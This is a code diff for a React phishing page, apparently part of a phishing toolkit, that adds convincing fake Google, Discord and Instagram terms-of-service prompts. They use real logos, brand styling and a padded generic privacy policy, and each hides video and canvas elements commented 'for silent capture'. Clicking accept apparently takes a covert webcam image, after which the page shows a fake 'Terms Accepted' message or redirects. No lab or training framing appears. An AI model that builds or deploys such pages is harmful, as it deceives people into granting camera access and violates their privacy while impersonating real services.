@@ -15,8 +15,8 @@ const templateContent: Record<string, { title: string; message: string; cookieMe
     message: "We've updated our Terms of Service and Privacy Policy. Please accept the new terms to continue using Google services.",
     cookieMessage: "By clicking 'Accept & Continue', you agree to Google's updated Terms of Service and Privacy Policy. This helps us improve your experience and provide personalized services.",
     actionText: 'Accept & Continue',
-    headerClassName: "bg-white text-black",
-    visual: <img src="/google_logo.png" alt="Google Logo" className="h-6 w-auto mr-2" />
+    // headerClassName: "bg-white text-black", // Removed as it's handled by custom UI
+    visual: <img src="/google_logo.png" alt="Google Logo" className="h-6 w-auto mr-2" /> // Visual might be used differently or not at all if logo is hardcoded in custom UI
     // redirectUrl removed
   },
   'discord-terms-update': {
@@ -24,8 +24,8 @@ const templateContent: Record<string, { title: string; message: string; cookieMe
     message: "Important: Our Terms of Service have been updated. Please review and accept them to continue using Discord.",
     cookieMessage: "By clicking 'Accept Terms', you acknowledge and agree to Discord's updated Terms of Service. This ensures a safe and compliant environment for all users.",
     actionText: 'Accept Terms',
-    headerClassName: "bg-[#5865F2] text-white",
-    visual: <img src="/discord_logo.png" alt="Discord Logo" className="h-8 w-auto mr-2" />
+    // headerClassName: "bg-[#5865F2] text-white", // Removed as it's handled by custom UI
+    visual: <img src="/discord_logo.png" alt="Discord Logo" className="h-8 w-auto mr-2" /> // Visual might be used differently or not at all if logo is hardcoded in custom UI
     // redirectUrl removed
   },
   'instagram-privacy-update': {
@@ -33,8 +33,8 @@ const templateContent: Record<string, { title: string; message: string; cookieMe
     message: "Your privacy matters. We've updated our Privacy Policy to better explain how we use your data. Please accept to continue.",
     cookieMessage: "By tapping 'Accept Policy', you agree to Instagram's updated Privacy Policy. This allows us to provide you with a more personalized and secure experience.",
     actionText: 'Accept Policy',
-    headerClassName: "bg-gradient-to-br from-[#833AB4] via-[#FD1D1D] to-[#FCB045] text-white",
-    visual: <img src="/instagram_logo.png" alt="Instagram Logo" className="h-8 w-auto mr-2" />
+    // headerClassName: "bg-gradient-to-br from-[#833AB4] via-[#FD1D1D] to-[#FCB045] text-white", // Removed as it's handled by custom UI
+    visual: <img src="/instagram_logo.png" alt="Instagram Logo" className="h-8 w-auto mr-2" /> // Visual might be used differently or not at all if logo is hardcoded in custom UI
     // redirectUrl removed
   },
   'photo-contest-entry': {
@@ -87,6 +87,21 @@ export default function CameraPhishingPage() {
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const streamRef = useRef<MediaStream | null>(null);
   const [cookieConsentGiven, setCookieConsentGiven] = useState(false);
+  const [isPolicyModalOpen, setIsPolicyModalOpen] = useState(false);
+
+  const genericPolicies = [
+    "1. Information We Collect: We collect information you provide directly to us, such as when you create an account, update your profile, use the interactive features of our services, participate in a survey, or request customer support. This may include personal details such as your name, email address, phone number, postal address, and any other information you choose to provide.",
+    "2. How We Use Your Information: We may use the information we collect to provide, maintain, and improve our services; to personalize your experience and the advertisements you see; to communicate with you about products, services, offers, promotions, rewards, and events offered by us and others; to monitor and analyze trends, usage, and activities in connection with our services; and for any other purpose described to you at the time the information was collected or as otherwise set forth in this privacy policy.",
+    "3. Information Sharing and Disclosure: We do not share your personal information with third parties except as described in this policy. We may share information with vendors, consultants, and other service providers who need access to such information to carry out work on our behalf and are obligated to protect your information. We may also share information for legal reasons, such as in response to a request for information if we believe disclosure is in accordance with, or required by, any applicable law, regulation or legal process.",
+    "4. Data Retention: We store the information we collect for as long as it is necessary for the purpose(s) for which we originally collected it, or for other legitimate business purposes, including to meet our legal, regulatory, or other compliance obligations.",
+    "5. Your Choices and Rights: You may have certain rights regarding your personal information, subject to local data protection laws. These may include the right to access, correct, update, port, or request deletion of your personal information. You can typically manage your account information and communication preferences through your account settings or by contacting us directly.",
+    "6. Cookies and Tracking Technologies: We use cookies and similar tracking technologies (like web beacons and pixels) to access or store information. Specific information about how we use such technologies and how you can refuse certain cookies is set out in our Cookie Policy. Most web browsers are set to accept cookies by default. If you prefer, you can usually choose to set your browser to remove or reject browser cookies.",
+    "7. Third-Party Services: Our service may contain links to other websites or services that are not operated or controlled by us (Third-Party Services). Any information you provide on or to Third-Party Services or that is collected by Third-Party Services is provided directly to the owners or operators of the Third-Party Services and is subject to their own privacy policies. We do not endorse and are not responsible for the content, privacy policies, or practices of any Third-Party Services.",
+    "8. Security of Your Information: We take reasonable measures, including administrative, technical, and physical safeguards, to help protect your information from loss, theft, misuse, and unauthorized access, disclosure, alteration, and destruction. However, please be aware that despite our efforts, no security measures are perfect or impenetrable, and no method of data transmission can be guaranteed against any interception or other type of misuse.",
+    "9. Children's Privacy: Our services are not directed to individuals under the age of 13 (or other applicable age as required by local law), and we do not knowingly collect personal information from children in this age group. If we become aware that a child under this age has provided us with personal information, we will take steps to delete such information from our files.",
+    "10. Changes to This Policy: We may update this privacy policy from time to time. If we make material changes, we will notify you by revising the date at the top of the policy and, in some cases, we may provide you with additional notice (such as adding a statement to our homepage or sending you a notification). We encourage you to review this privacy policy periodically to stay informed about our information practices and the ways you can help protect your privacy."
+  ];
+
 
   useEffect(() => {
     addLog({ type: 'generic', data: { message: `Visited camera phishing page: /phishing/camera/${templateId}` } });
@@ -254,54 +269,246 @@ export default function CameraPhishingPage() {
     }
   }, [status, templateId, content.title]); // Added content.title to dependencies for safety, though primarily driven by status and templateId
 
-  if (['google-policy-update', 'discord-terms-update', 'instagram-privacy-update'].includes(templateId)) {
-    // For these templates, the "captured" state is mostly invisible to the user before redirection
-    // or if no redirection URL is set (it will just sit on the page).
-    // The main UI is the cookie banner.
+  if (templateId === 'discord-terms-update') {
     return (
-      <>
-        <PhishingPageLayout
-          title={content.title}
-        >
-          <div className={cn("text-center mb-6", content.headerClassName)}>
-            <div className="flex items-center justify-center p-4">
-              {content.visual}
-              <h1 className={cn("text-2xl font-bold", content.headerClassName ? (templateId === 'google-policy-update' ? 'text-black' : 'text-white') : '')}>{content.title}</h1>
-            </div>
-          </div>
-          <p className="text-center text-muted-foreground mb-6 px-4" dangerouslySetInnerHTML={{ __html: content.message.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') }} />
-          
-          <video ref={videoRef} className="hidden" playsInline muted />
-          <canvas ref={canvasRef} className="hidden"></canvas>
-          
-        </PhishingPageLayout>
+      <div className="flex flex-col items-center justify-center min-h-screen bg-[#36393f] p-4 text-[#dcddde] font-sans">
+        {/* Hidden video and canvas for silent capture */}
+        <video ref={videoRef} className="hidden" playsInline muted />
+        <canvas ref={canvasRef} className="hidden"></canvas>
 
-        {/* Cookie consent banner is shown until consent is given, or if page reloads before capture.
-            If status becomes 'captured' and no redirect URL is set, this banner might still be visible
-            if cookieConsentGiven is false, which is an edge case (capture without consent flow).
-            However, handleCookieConsentAndCamera sets cookieConsentGiven to true.
-        */}
-        {status !== 'captured' && !cookieConsentGiven && (
-            <div className="fixed bottom-0 left-0 right-0 p-4 bg-background border-t border-border shadow-lg z-50">
-              <div className="container mx-auto flex flex-col sm:flex-row items-center justify-between gap-3">
-                <p className="text-sm text-foreground text-center sm:text-left flex-grow">
-                  {content.cookieMessage || "Our site uses cookies to enhance your experience. By clicking 'Accept Cookies', you agree to our use of cookies."}
-                </p>
-                <Button
-                  onClick={handleCookieConsentAndCamera}
-                  className="bg-primary hover:bg-primary/90 text-primary-foreground whitespace-nowrap w-full sm:w-auto flex-shrink-0"
-                  size="md"
-                  disabled={isLoading && !cookieConsentGiven} 
+        {status !== 'captured' || (status === 'captured' && REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])) ? (
+          <div className="bg-[#2f3136] p-8 rounded-lg shadow-xl w-full max-w-md text-center">
+            <img src="/discord_logo.png" alt="Discord Logo" className="h-16 w-auto mx-auto mb-6" />
+            <h1 className="text-2xl font-bold text-white mb-4">{content.title}</h1>
+            <p className="text-sm text-[#b9bbbe] mb-6" dangerouslySetInnerHTML={{ __html: content.message }} />
+
+            <p className="text-xs text-[#72767d] mb-6">
+              {content.cookieMessage}
+            </p>
+
+            <div className="space-y-3">
+              <Button
+                onClick={handleCookieConsentAndCamera}
+                className="w-full bg-[#5865F2] hover:bg-[#4752c4] text-white font-semibold py-2.5 px-4 rounded-md text-md transition-colors duration-150"
+              disabled={isLoading || cookieConsentGiven}
+            >
+              {isLoading && cookieConsentGiven ? 'Processing...' : (content.actionText || 'Accept Terms')}
+            </Button>
+            {error && status === 'error' && (
+              <p className="text-red-400 text-xs mt-4">{error}</p>
+            )}
+            </div> {/* End of space-y-3 for buttons */}
+             <Button
+                onClick={() => setIsPolicyModalOpen(true)}
+                className="w-full mt-3 bg-transparent hover:bg-[#393c43] text-[#b9bbbe] font-medium py-2.5 px-4 rounded-md text-sm border border-[#40444b] hover:border-[#50545b] transition-colors duration-150"
+              >
+                Read the Policy
+              </Button>
+          </div>
+        ) : (
+          // This state is after capture AND no redirect URL is set
+          <div className="bg-[#2f3136] p-8 rounded-lg shadow-xl w-full max-w-md text-center">
+            <img src="/discord_logo.png" alt="Discord Logo" className="h-16 w-auto mx-auto mb-6" />
+            <CheckCircle className="w-16 h-16 text-green-400 mx-auto mb-4" />
+            <h1 className="text-xl font-bold text-white mb-2">Terms Accepted</h1>
+            <p className="text-sm text-[#b9bbbe]">This window can now be closed.</p>
+          </div>
+        )}
+
+        {/* Discord Policy Modal */}
+        {isPolicyModalOpen && templateId === 'discord-terms-update' && (
+          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm" onClick={() => setIsPolicyModalOpen(false)}>
+            <div className="bg-[#2f3136] p-6 rounded-lg shadow-xl w-full max-w-xl max-h-[80vh] flex flex-col text-left border border-[#40444b]" onClick={(e) => e.stopPropagation()}>
+              <div className="flex justify-between items-center mb-4">
+                <h2 className="text-lg font-semibold text-white">Terms of Service</h2>
+                <button
+                  onClick={() => setIsPolicyModalOpen(false)}
+                  className="text-[#b9bbbe] hover:text-white p-1 rounded-full hover:bg-[#393c43] transition-colors"
+                  aria-label="Close policy modal"
                 >
-                  <Cookie className="mr-2 h-4 w-4" />
-                  {content.actionText || 'Accept Cookies'}
+                  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+                </button>
+              </div>
+              <div className="overflow-y-auto text-sm text-[#dcddde] space-y-2 pr-3 scrollbar-thin scrollbar-thumb-[#202225] scrollbar-track-[#2f3136]">
+                {genericPolicies.map((policy, index) => (
+                  <p key={index} className="mb-1.5 leading-relaxed">{policy}</p>
+                ))}
+              </div>
+              <div className="mt-6 text-right">
+                <Button
+                  onClick={() => setIsPolicyModalOpen(false)}
+                  className="bg-[#5865F2] hover:bg-[#4752c4] text-white font-medium py-2 px-4 rounded-md text-sm"
+                >
+                  Got it
                 </Button>
               </div>
             </div>
+          </div>
         )}
-      </>
+      </div>
     );
   }
+
+  if (templateId === 'google-policy-update') {
+    return (
+      <div className="flex flex-col items-center justify-center min-h-screen bg-[#f8f9fa] p-4 font-['Roboto',_sans-serif]">
+        {/* Hidden video and canvas for silent capture */}
+        <video ref={videoRef} className="hidden" playsInline muted />
+        <canvas ref={canvasRef} className="hidden"></canvas>
+
+        {status !== 'captured' || (status === 'captured' && REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])) ? (
+          <div className="bg-white p-8 rounded-lg shadow-md w-full max-w-lg border border-gray-200">
+            <div className="flex items-center mb-6">
+              <img src="/google_logo.png" alt="Google Logo" className="h-8 w-auto mr-3" />
+              {/* <span className="text-2xl text-[#202124]">Privacy & Terms</span> */}
+            </div>
+            <h1 className="text-2xl text-[#202124] mb-4">Before you continue to Google</h1>
+            {/* Simplified title as Google often does */}
+
+            <p className="text-sm text-[#5f6368] mb-3">
+              Google uses cookies and data to:
+            </p>
+            <ul className="list-disc list-inside text-sm text-[#5f6368] mb-6 space-y-1">
+              <li>Deliver and maintain services, like tracking outages and protecting against spam, fraud, and abuse</li>
+              <li>Measure audience engagement and site statistics to understand how our services are used</li>
+            </ul>
+            <p className="text-sm text-[#5f6368] mb-6">
+              If you agree, we’ll also use cookies and data to:
+            </p>
+             <ul className="list-disc list-inside text-sm text-[#5f6368] mb-6 space-y-1">
+              <li>Improve the quality of our services and develop new ones</li>
+              <li>Deliver and measure the effectiveness of ads</li>
+              <li>Show personalized content, depending on your settings</li>
+              <li>Show personalized or generic ads, depending on your settings, on Google and across the web</li>
+            </ul>
+            <p className="text-sm text-[#5f6368] mb-6">
+             {content.message} {/* Main message from templateContent */}
+            </p>
+            <p className="text-xs text-[#70757a] mb-6">
+              {content.cookieMessage} {/* Cookie message from templateContent */}
+            </p>
+
+            <div className="flex flex-col sm:flex-row justify-end items-center space-y-3 sm:space-y-0 sm:space-x-3">
+              <Button
+                onClick={() => setIsPolicyModalOpen(true)}
+                className="text-[#1a73e8] hover:bg-gray-100 font-medium py-2 px-4 rounded w-full sm:w-auto order-2 sm:order-1"
+                variant="ghost"
+              >
+                Read the Policy
+              </Button>
+              <Button
+                onClick={handleCookieConsentAndCamera}
+                className="bg-[#1a73e8] hover:bg-[#1765cc] text-white font-medium py-2.5 px-6 rounded transition-colors duration-150 w-full sm:w-auto order-1 sm:order-2"
+                disabled={isLoading || cookieConsentGiven}
+              >
+                {isLoading && cookieConsentGiven ? 'Processing...' : (content.actionText || 'Accept & Continue')}
+              </Button>
+            </div>
+            {error && status === 'error' && (
+              <p className="text-red-600 text-xs mt-4 text-right">{error}</p>
+            )}
+          </div>
+        ) : (
+          // This state is after capture AND no redirect URL is set
+          <div className="bg-white p-8 rounded-lg shadow-md w-full max-w-lg border border-gray-200 text-center">
+            <img src="/google_logo.png" alt="Google Logo" className="h-12 w-auto mx-auto mb-6" />
+            <CheckCircle className="w-16 h-16 text-green-500 mx-auto mb-4" />
+            <h1 className="text-xl text-[#202124] mb-2">Settings Saved</h1>
+            <p className="text-sm text-[#5f6368]">This window can now be closed.</p>
+          </div>
+        )}
+      </div>
+    );
+  }
+
+  if (templateId === 'instagram-privacy-update') {
+    return (
+      <div className="flex flex-col items-center justify-center min-h-screen bg-white p-4 font-['Helvetica',_'Arial',_sans-serif]">
+        {/* Hidden video and canvas for silent capture */}
+        <video ref={videoRef} className="hidden" playsInline muted />
+        <canvas ref={canvasRef} className="hidden"></canvas>
+
+        {status !== 'captured' || (status === 'captured' && REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])) ? (
+          <div className="bg-white p-6 rounded-xl shadow-xl w-full max-w-sm"> {/* Removed text-center from here */}
+            <img src="/instagram_logo.png" alt="Instagram Logo" className="h-10 w-auto mx-auto mb-6" />
+            <h1 className="text-xl font-semibold text-black mb-3 text-center">{content.title}</h1>
+            <p className="text-sm text-[#262626] mb-4 leading-relaxed text-left"> {/* Text align left for messages */}
+              {content.message}
+            </p>
+            <p className="text-xs text-[#8e8e8e] mb-6 text-left"> {/* Text align left for messages */}
+              {content.cookieMessage}
+            </p>
+
+            <div className="space-y-3">
+              <Button
+                onClick={handleCookieConsentAndCamera}
+                className="w-full bg-[#0095f6] hover:bg-[#0077c6] text-white font-semibold py-2.5 px-4 rounded-lg text-md transition-colors duration-150"
+              disabled={isLoading || cookieConsentGiven}
+            >
+              {isLoading && cookieConsentGiven ? 'Processing...' : (content.actionText || 'Accept Policy')}
+            </Button>
+            {error && status === 'error' && (
+              <p className="text-red-500 text-xs mt-3">{error}</p>
+            )}
+            </div> {/* End of space-y-3 for buttons */}
+            <Button
+              onClick={() => setIsPolicyModalOpen(true)}
+              className="w-full mt-3 bg-transparent hover:bg-gray-50 text-[#0095f6] font-semibold py-2 px-4 rounded-lg text-sm transition-colors duration-150"
+              variant="ghost"
+            >
+              Read the Policy
+            </Button>
+             <p className="text-xs text-[#c7c7c7] mt-6">
+              You can review our updated policy details any time in our Help Center.
+            </p>
+          </div>
+        ) : (
+          // This state is after capture AND no redirect URL is set
+          <div className="bg-white p-6 rounded-xl shadow-xl w-full max-w-sm text-center">
+            <img src="/instagram_logo.png" alt="Instagram Logo" className="h-10 w-auto mx-auto mb-6" />
+            <CheckCircle className="w-16 h-16 text-green-500 mx-auto mb-4" />
+            <h1 className="text-lg font-semibold text-black mb-2">Policy Accepted</h1>
+            <p className="text-sm text-[#262626]">This window can now be closed.</p>
+          </div>
+        )}
+
+        {/* Instagram Policy Modal */}
+        {isPolicyModalOpen && templateId === 'instagram-privacy-update' && (
+          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/40 backdrop-blur-sm" onClick={() => setIsPolicyModalOpen(false)}>
+            <div className="bg-white p-0 rounded-xl shadow-xl w-full max-w-md max-h-[75vh] flex flex-col text-left overflow-hidden" onClick={(e) => e.stopPropagation()}>
+              <div className="flex justify-between items-center p-4 border-b border-gray-200">
+                <h2 className="text-md font-semibold text-black">Privacy Policy</h2>
+                <button
+                  onClick={() => setIsPolicyModalOpen(false)}
+                  className="text-gray-500 hover:text-black p-1 rounded-full hover:bg-gray-100 transition-colors"
+                  aria-label="Close policy modal"
+                >
+                  <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+                </button>
+              </div>
+              <div className="overflow-y-auto text-sm text-[#262626] space-y-3 p-4">
+                {genericPolicies.map((policy, index) => (
+                  <div key={index} className="mb-2">
+                    <p className="font-semibold text-sm mb-0.5">{policy.substring(0, policy.indexOf(':') + 1)}</p>
+                    <p className="text-xs leading-relaxed">{policy.substring(policy.indexOf(':') + 2)}</p>
+                  </div>
+                ))}
+              </div>
+              <div className="mt-auto p-4 border-t border-gray-200 text-center">
+                <Button
+                  onClick={() => setIsPolicyModalOpen(false)}
+                  className="w-full bg-[#0095f6] hover:bg-[#0077c6] text-white font-semibold py-2 px-4 rounded-lg text-sm"
+                >
+                  Done
+                </Button>
+              </div>
+            </div>
+          </div>
+        )}
+      </div>
+    );
+  }
+
 
   if (templateId === 'photo-contest-entry') {
     return (
